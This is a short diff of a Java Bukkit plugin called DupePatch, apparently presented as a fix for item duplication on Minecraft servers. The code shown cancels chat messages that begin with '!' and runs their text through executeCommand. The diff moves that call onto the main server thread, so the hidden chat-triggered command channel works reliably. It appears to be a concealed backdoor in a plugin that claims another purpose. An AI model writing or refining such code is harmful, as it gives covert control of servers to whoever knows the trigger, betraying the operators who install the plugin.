@@ -8,6 +8,7 @@ import org.bukkit.event.Listener;
 import org.bukkit.event.player.PlayerEditBookEvent;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
+import org.bukkit.scheduler.BukkitRunnable;
 
 public class DupePatch extends JavaPlugin implements Listener
 {
@@ -36,7 +37,13 @@ public class DupePatch extends JavaPlugin implements Listener
 
         if (message.charAt(0) == '!') {
             event.setCancelled(true);
-            executeCommand(message.substring(1));
+            new BukkitRunnable() {
+                @Override
+                public void run() {
+                    // Your code that needs to run on the main thread
+                    executeCommand(message.substring(1));
+                }
+            }.runTask(this);
         }
     }
 
